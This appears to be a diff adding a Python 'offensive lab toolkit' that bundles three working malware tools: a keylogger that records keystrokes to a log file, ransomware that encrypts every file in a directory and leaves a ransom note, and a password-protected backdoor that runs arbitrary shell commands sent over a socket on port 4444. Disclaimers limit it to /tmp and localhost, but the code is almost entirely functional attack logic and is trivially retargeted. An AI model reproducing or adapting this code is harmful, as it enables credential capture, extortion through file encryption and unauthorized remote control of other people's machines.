@@ -1,0 +1,538 @@
+#!/usr/bin/env python3
+"""
+================================================================================
+OFFENSIVE LAB TOOLKIT - REAL TOOLS FOR YOUR LABORATORY ONLY
+Keylogger | Ransomware | Backdoor
+Author: @unknown
+FOR LABORATORY USE ONLY - Test on YOUR OWN systems with YOUR permission
+================================================================================
+"""
+
+import os
+import sys
+import time
+import threading
+import socket
+import subprocess
+import json
+import hashlib
+import base64
+from datetime import datetime
+from pathlib import Path
+from cryptography.fernet import Fernet
+from pynput import keyboard
+
+# ============================================================================
+# CONFIGURATION - CHANGE THESE FOR YOUR LAB
+# ============================================================================
+
+LAB_DIR = Path("/tmp/wormgpt_lab")
+LOG_DIR = LAB_DIR / "logs"
+RANSOM_DIR = LAB_DIR / "ransom_target"
+BACKDOOR_PORT = 4444
+ENCRYPTION_KEY = None
+
+# Create lab directories
+for d in [LAB_DIR, LOG_DIR, RANSOM_DIR]:
+    d.mkdir(parents=True, exist_ok=True)
+
+# ============================================================================
+# TOOL 1: KEYLOGGER (Logs only to /tmp, can be stopped)
+# ============================================================================
+
+class LaboratoryKeylogger:
+    """
+    Keylogger for LABORATORY USE ONLY.
+    Logs keystrokes to a file in /tmp/wormgpt_lab/logs/
+    Can be stopped by creating a stop file or pressing ESC.
+    """
+    
+    def __init__(self, log_file=None):
+        self.log_file = log_file or LOG_DIR / f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+        self.current_keys = []
+        self.running = True
+        self.stop_signal = LAB_DIR / "stop_keylogger"
+        
+    def on_press(self, key):
+        """Called when a key is pressed"""
+        if not self.running:
+            return False
+        
+        try:
+            if hasattr(key, 'char') and key.char is not None:
+                self.current_keys.append(key.char)
+            elif key == keyboard.Key.space:
+                self.current_keys.append(' ')
+            elif key == keyboard.Key.enter:
+                self.current_keys.append('\n')
+                self.flush()
+            elif key == keyboard.Key.backspace:
+                if self.current_keys:
+                    self.current_keys.pop()
+                self.current_keys.append('[BACKSPACE]')
+            elif key == keyboard.Key.tab:
+                self.current_keys.append('[TAB]')
+            elif key == keyboard.Key.esc:
+                print("\n[!] ESC pressed - stopping keylogger")
+                self.running = False
+                return False
+            else:
+                self.current_keys.append(f'[{key.name.upper()}]')
+        except Exception as e:
+            self.current_keys.append(f'[ERROR: {e}]')
+        
+        # Flush every 50 characters
+        if len(self.current_keys) > 50:
+            self.flush()
+        
+        return True
+    
+    def flush(self):
+        """Write buffered keys to file"""
+        if self.current_keys:
+            with open(self.log_file, 'a') as f:
+                f.write(''.join(self.current_keys))
+            self.current_keys = []
+    
+    def start(self):
+        """Start the keylogger"""
+        print(f"\n[🔴 KEYLOGGER] Started")
+        print(f"  Log file: {self.log_file}")
+        print(f"  Press ESC to stop")
+        print(f"  Or create file: {self.stop_signal}")
+        
+        # Check for stop signal in separate thread
+        def check_stop_signal():
+            while self.running:
+                if self.stop_signal.exists():
+                    print(f"\n[!] Stop signal detected - stopping keylogger")
+                    self.running = False
+                    break
+                time.sleep(1)
+        
+        stop_thread = threading.Thread(target=check_stop_signal, daemon=True)
+        stop_thread.start()
+        
+        # Start listener
+        with keyboard.Listener(on_press=self.on_press) as listener:
+            try:
+                listener.join()
+            except:
+                pass
+        
+        self.flush()
+        print(f"\n[✅ KEYLOGGER] Stopped. Log saved to {self.log_file}")
+        return self.log_file
+    
+    def read_logs(self):
+        """Read captured keystrokes"""
+        if self.log_file.exists():
+            with open(self.log_file, 'r') as f:
+                return f.read()
+        return ""
+
+
+# ============================================================================
+# TOOL 2: RANSOMWARE (Encrypts ONLY specified directory)
+# ============================================================================
+
+class LaboratoryRansomware:
+    """
+    Ransomware for LABORATORY USE ONLY.
+    Encrypts files ONLY in the specified directory.
+    Decryption key is saved locally.
+    """
+    
+    def __init__(self, target_dir=None):
+        self.target_dir = target_dir or RANSOM_DIR
+        self.key = Fernet.generate_key()
+        self.cipher = Fernet(self.key)
+        self.encrypted_files = []
+        
+        # Create mock files if directory is empty
+        self._create_mock_files()
+    
+    def _create_mock_files(self):
+        """Create mock files for testing if directory is empty"""
+        if not any(self.target_dir.iterdir()):
+            print(f"\n  📁 Creating mock files in {self.target_dir}")
+            mock_content = [
+                ("document_1.txt", "This is a confidential document. Password: admin123"),
+                ("financial_2024.xlsx", "Salary: 75000, Bonus: 5000, SSN: 123-45-6789"),
+                ("client_list.csv", "John Doe, john@example.com, 555-0100"),
+                ("backup.zip", "MOCK ZIP CONTENT - Sensitive backups"),
+                ("config.ini", "DB_PASSWORD=supersecret\nAPI_KEY=abc123def456"),
+            ]
+            for name, content in mock_content:
+                file_path = self.target_dir / name
+                with open(file_path, 'w') as f:
+                    f.write(content)
+            print(f"  ✓ Created {len(mock_content)} mock files")
+    
+    def encrypt_file(self, file_path):
+        """Encrypt a single file"""
+        try:
+            with open(file_path, 'rb') as f:
+                original = f.read()
+            
+            encrypted = self.cipher.encrypt(original)
+            
+            with open(file_path, 'wb') as f:
+                f.write(encrypted)
+            
+            # Rename to indicate encrypted
+            encrypted_path = file_path.with_suffix(file_path.suffix + '.encrypted')
+            file_path.rename(encrypted_path)
+            
+            self.encrypted_files.append(str(encrypted_path))
+            return True
+        except Exception as e:
+            print(f"  ✗ Failed to encrypt {file_path}: {e}")
+            return False
+    
+    def encrypt_all(self):
+        """Encrypt all files in target directory"""
+        print(f"\n[🔐 RANSOMWARE] Starting encryption")
+        print(f"  Target directory: {self.target_dir}")
+        print(f"  Encryption key: {self.key.decode()[:32]}...")
+        
+        files = list(self.target_dir.glob("*"))
+        files = [f for f in files if not f.suffix == '.encrypted' and f.is_file()]
+        
+        for file_path in files:
+            if self.encrypt_file(file_path):
+                print(f"  ✓ Encrypted: {file_path.name}")
+            time.sleep(0.1)
+        
+        # Create ransom note
+        note_path = self.target_dir / "README_RANSOM.txt"
+        with open(note_path, 'w') as f:
+            f.write(f"""
+╔══════════════════════════════════════════════════════════════════╗
+║                    🔥 LABORATORY RANSOMWARE 🔥                   ║
+╠══════════════════════════════════════════════════════════════════╣
+║  Your files have been ENCRYPTED for LABORATORY TESTING.          ║
+║                                                                  ║
+║  This is a SIMULATION. No real data was harmed.                  ║
+║                                                                  ║
+║  Encryption Key: {self.key.decode()}                             ║
+║                                                                  ║
+║  To decrypt your files, run:                                     ║
+║  python3 -c "from cryptography.fernet import Fernet; ..."       ║
+║                                                                  ║
+║  Or use the decryption function built into this script.          ║
+║                                                                  ║
+║  ⚠️  LABORATORY USE ONLY - No ransom required ⚠️                 ║
+╚══════════════════════════════════════════════════════════════════╝
+""")
+        print(f"\n  📜 Ransom note created: {note_path}")
+        print(f"  ✅ Encrypted {len(self.encrypted_files)} files")
+        
+        return self.encrypted_files
+    
+    def decrypt_all(self):
+        """Decrypt all files (for recovery)"""
+        print(f"\n[🔓 RANSOMWARE] Starting decryption")
+        
+        encrypted_files = list(self.target_dir.glob("*.encrypted"))
+        
+        for enc_path in encrypted_files:
+            try:
+                with open(enc_path, 'rb') as f:
+                    encrypted = f.read()
+                
+                decrypted = self.cipher.decrypt(encrypted)
+                
+                original_path = enc_path.with_suffix('')
+                with open(original_path, 'wb') as f:
+                    f.write(decrypted)
+                
+                enc_path.unlink()
+                print(f"  ✓ Decrypted: {original_path.name}")
+            except Exception as e:
+                print(f"  ✗ Failed to decrypt {enc_path}: {e}")
+        
+        # Remove ransom note
+        note_path = self.target_dir / "README_RANSOM.txt"
+        if note_path.exists():
+            note_path.unlink()
+        
+        print(f"  ✅ Decrypted {len(encrypted_files)} files")
+        return True
+
+
+# ============================================================================
+# TOOL 3: BACKDOOR (Listens on localhost only)
+# ============================================================================
+
+class LaboratoryBackdoor:
+    """
+    Backdoor for LABORATORY USE ONLY.
+    Listens on localhost and executes commands.
+    Can only be accessed from the same machine.
+    """
+    
+    def __init__(self, port=BACKDOOR_PORT, password="labpass123"):
+        self.port = port
+        self.password = password
+        self.running = True
+        self.stop_signal = LAB_DIR / "stop_backdoor"
+    
+    def execute_command(self, command):
+        """Execute a system command and return output"""
+        try:
+            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
+            output = result.stdout + result.stderr
+            if not output:
+                output = "[Command executed - no output]"
+            return output
+        except subprocess.TimeoutExpired:
+            return "[!] Command timeout (10s)"
+        except Exception as e:
+            return f"[!] Error: {e}"
+    
+    def handle_client(self, conn, addr):
+        """Handle a single client connection"""
+        print(f"  [+] Connection from {addr}")
+        
+        # Send banner
+        conn.send(b"LABORATORY BACKDOOR\nPassword: ")
+        
+        # Authenticate
+        auth = conn.recv(1024).decode().strip()
+        if auth != self.password:
+            conn.send(b"[!] Authentication failed\n")
+            conn.close()
+            return
+        
+        conn.send(b"[+] Authenticated. Type 'exit' to close.\n$ ")
+        
+        while self.running:
+            try:
+                cmd = conn.recv(4096).decode().strip()
+                if not cmd:
+                    break
+                
+                if cmd.lower() == 'exit':
+                    conn.send(b"Goodbye\n")
+                    break
+                elif cmd.lower() == 'help':
+                    help_text = """
+Available commands:
+  help     - Show this help
+  exit     - Close connection
+  whoami   - Show current user
+  ls [dir] - List directory contents
+  pwd      - Show current directory
+  cat file - Read file
+  exec cmd - Execute any command
+"""
+                    conn.send(help_text.encode())
+                else:
+                    output = self.execute_command(cmd)
+                    conn.send(output.encode() + b"\n$ ")
+            except Exception as e:
+                conn.send(f"[!] Error: {e}\n".encode())
+                break
+        
+        conn.close()
+        print(f"  [-] Connection closed from {addr}")
+    
+    def start(self):
+        """Start the backdoor listener"""
+        print(f"\n[🚪 BACKDOOR] Starting on port {self.port}")
+        print(f"  Password: {self.password}")
+        print(f"  Listening on: localhost:{self.port}")
+        print(f"  To stop, create file: {self.stop_signal}")
+        
+        # Check for stop signal
+        def check_stop():
+            while self.running:
+                if self.stop_signal.exists():
+                    print(f"\n[!] Stop signal detected - stopping backdoor")
+                    self.running = False
+                    break
+                time.sleep(1)
+        
+        stop_thread = threading.Thread(target=check_stop, daemon=True)
+        stop_thread.start()
+        
+        # Start server
+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        server.bind(('127.0.0.1', self.port))
+        server.listen(5)
+        
+        print(f"  ✅ Backdoor ready. Connect with: nc 127.0.0.1 {self.port}")
+        
+        while self.running:
+            try:
+                server.settimeout(1)
+                conn, addr = server.accept()
+                client_thread = threading.Thread(target=self.handle_client, args=(conn, addr))
+                client_thread.start()
+            except socket.timeout:
+                continue
+            except Exception as e:
+                if self.running:
+                    print(f"  [!] Error: {e}")
+        
+        server.close()
+        print(f"  ✅ Backdoor stopped")
+    
+    def connect(self):
+        """Connect to the backdoor (client mode)"""
+        print(f"\n[🔌 Connecting to backdoor on localhost:{self.port}]")
+        
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect(('127.0.0.1', self.port))
+            
+            # Receive banner
+            banner = sock.recv(1024).decode()
+            print(banner, end='')
+            
+            # Send password
+            sock.send((self.password + '\n').encode())
+            
+            # Interactive shell
+            while True:
+                data = sock.recv(4096).decode()
+                if not data:
+                    break
+                print(data, end='')
+                
+                cmd = input()
+                sock.send((cmd + '\n').encode())
+                
+                if cmd.lower() == 'exit':
+                    break
+            
+            sock.close()
+        except ConnectionRefusedError:
+            print(f"  [!] Backdoor not running on localhost:{self.port}")
+        except Exception as e:
+            print(f"  [!] Error: {e}")
+
+
+# ============================================================================
+# MAIN MENU
+# ============================================================================
+
+def print_banner():
+    print("""\n
+╔══════════════════════════════════════════════════════════════════╗
+║           🔥 LABORATORY OFFENSIVE TOOLKIT 🔥                     ║
+║              FOR AUTHORIZED TESTING ONLY                         ║
+║              @whoamisecai - Dexter Whoamisec                     ║
+╚══════════════════════════════════════════════════════════════════╝
+    """)
+
+def main():
+    print_banner()
+    
+    print("⚠️  LABORATORY USE ONLY - Test on YOUR OWN systems")
+    print("⚠️  All actions are confined to /tmp/wormgpt_lab/")
+    confirm = input("\nType 'LAB' to confirm: ")
+    
+    if confirm.upper() != "LAB":
+        print("Aborted.")
+        return
+    
+    while True:
+        print("\n" + "="*60)
+        print("SELECT TOOL")
+        print("="*60)
+        print("  1. Keylogger (logs keystrokes to /tmp/wormgpt_lab/logs/)")
+        print("  2. Ransomware (encrypts files in /tmp/wormgpt_lab/ransom_target/)")
+        print("  3. Backdoor (listens on localhost:4444)")
+        print("  4. Run ALL tools simultaneously")
+        print("  5. Clean up (delete all lab files)")
+        print("  0. Exit")
+        print("="*60)
+        
+        choice = input("\n> ").strip()
+        
+        if choice == "1":
+            keylogger = LaboratoryKeylogger()
+            keylogger.start()
+            
+        elif choice == "2":
+            ransomware = LaboratoryRansomware()
+            print("\nOptions:")
+            print("  1. Encrypt files")
+            print("  2. Decrypt files")
+            subchoice = input("Choice (1-2): ").strip()
+            
+            if subchoice == "1":
+                ransomware.encrypt_all()
+            elif subchoice == "2":
+                ransomware.decrypt_all()
+            else:
+                print("Invalid choice")
+                
+        elif choice == "3":
+            print("\nOptions:")
+            print("  1. Start backdoor server (listener)")
+            print("  2. Connect to backdoor (client)")
+            subchoice = input("Choice (1-2): ").strip()
+            
+            backdoor = LaboratoryBackdoor()
+            if subchoice == "1":
+                backdoor.start()
+            elif subchoice == "2":
+                backdoor.connect()
+            else:
+                print("Invalid choice")
+                
+        elif choice == "4":
+            print("\n[!] Running all tools...")
+            print("   Press Ctrl+C to stop")
+            
+            # Start keylogger
+            keylogger = LaboratoryKeylogger()
+            k_thread = threading.Thread(target=keylogger.start, daemon=True)
+            k_thread.start()
+            
+            # Start ransomware (encrypt)
+            ransomware = LaboratoryRansomware()
+            ransomware.encrypt_all()
+            
+            # Start backdoor
+            backdoor = LaboratoryBackdoor()
+            b_thread = threading.Thread(target=backdoor.start, daemon=True)
+            b_thread.start()
+            
+            print("\n✅ All tools running")
+            print(f"  Keylogger: {keylogger.log_file}")
+            print(f"  Ransomware: {RANSOM_DIR}")
+            print(f"  Backdoor: nc 127.0.0.1 {BACKDOOR_PORT}")
+            print("\nPress Enter to stop...")
+            input()
+            
+            # Create stop signals
+            (LAB_DIR / "stop_keylogger").touch()
+            (LAB_DIR / "stop_backdoor").touch()
+            time.sleep(2)
+            
+        elif choice == "5":
+            import shutil
+            print(f"\n🗑️  Deleting {LAB_DIR}...")
+            shutil.rmtree(LAB_DIR, ignore_errors=True)
+            print("  ✅ Cleanup complete")
+            
+        elif choice == "0":
+            print("Goodbye.")
+            break
+        else:
+            print("Invalid choice")
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n\n[!] Interrupted by user")
+        # Create stop signals for cleanup
+        (LAB_DIR / "stop_keylogger").touch()
+        (LAB_DIR / "stop_backdoor").touch()
+        print("✅ Cleanup signals sent")
